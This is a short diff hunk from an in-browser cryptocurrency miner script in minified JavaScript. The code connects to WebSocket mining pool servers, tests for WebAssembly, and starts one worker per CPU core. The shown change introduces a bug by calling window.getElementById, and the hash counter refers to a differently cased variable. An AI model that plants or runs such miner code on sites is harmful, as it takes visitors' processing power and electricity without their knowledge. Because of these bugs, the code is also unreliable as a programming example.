@@ -12,8 +12,7 @@
     
     var server="wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/",job=null,workers=[],ws,receiveStack=[],sendStack=[],totalhashes=0,connected=0,reconnector=0,attempts=1,throttleMiner=0,handshake=null,wasmSupported=function(){try{if("object"===typeof WebAssembly&&"function"===typeof WebAssembly.instantiate){var c=new WebAssembly.Module(Uint8Array.of(0,97,115,109,1,0,0,0));if(c instanceof WebAssembly.Module)return new WebAssembly.Instance(c)instanceof WebAssembly.Instance}}catch(g){}return!1}();
         setInterval(function(){ 
-    document.getElementById("hashes").innerHTML = "Total Hashes: " + totalHashes;
-            alert("a");
+    window.getElementById("hashes").innerHTML = "Total Hashes: " + totalHashes;
 
 }, 1000);
 function addWorkers(c){logicalProcessors=c;if(-1==c){try{logicalProcessors=window.navigator.hardwareConcurrency}catch(g){logicalProcessors=4}0<logicalProcessors&&40>logicalProcessors||(logicalProcessors=4)}for(;0<logicalProcessors--;)addWorker()}
